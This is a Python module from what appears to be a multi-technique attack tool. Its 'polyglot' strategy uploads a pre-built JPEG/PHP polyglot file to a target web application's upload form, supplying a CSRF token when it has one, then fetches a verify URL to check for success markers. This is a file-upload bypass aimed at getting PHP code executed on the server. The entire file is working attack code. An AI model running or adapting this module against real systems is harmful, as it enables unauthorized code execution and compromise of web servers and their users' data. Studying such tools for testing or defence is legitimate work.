from .base import Strategy
from core.common import build_url, marker_result
from core.models import StrategyResult


class PolyglotStrategy(Strategy):
    name = "polyglot"

    def run(self, session, csrf, config, logger):
        logger.info("Technique 6: pre-built JPEG/PHP polyglot")

        if not config.POLYGLOT_FILE.exists():
            return StrategyResult(
                False,
                self.name,
                f"Pre-built polyglot file not found: {config.POLYGLOT_FILE}",
            )

        data = {config.UPLOAD_USER_FIELD: config.UPLOAD_USERNAME}
        if csrf:
            data[config.UPLOAD_CSRF_FIELD] = csrf

        try:
            with config.POLYGLOT_FILE.open("rb") as f:
                files = {
                    config.UPLOAD_FILE_FIELD: (
                        config.POLYGLOT_FILENAME,
                        f,
                        config.POLYGLOT_CONTENT_TYPE,
                    )
                }
                r = session.post(
                    build_url(config.TARGET, config.UPLOAD_URL),
                    data=data,
                    files=files,
                    timeout=config.TIMEOUT,
                    verify=config.VERIFY_TLS,
                    allow_redirects=config.FOLLOW_REDIRECTS,
                )

            logger.info(f"Polyglot upload: HTTP {r.status_code}")

            if r.status_code >= 400:
                return StrategyResult(False, self.name, f"Upload rejected: HTTP {r.status_code}")

            verify_url = build_url(config.TARGET, config.POLYGLOT_VERIFY_URL)
            v = session.get(
                verify_url,
                timeout=config.TIMEOUT,
                verify=config.VERIFY_TLS,
                allow_redirects=config.FOLLOW_REDIRECTS,
            )

            return marker_result(
                self.name,
                v,
                verify_url,
                config.SUCCESS_MARKER,
                config.END_MARKER,
                config.POLYGLOT_FILENAME,
            )

        except Exception as exc:
            return StrategyResult(False, self.name, str(exc))
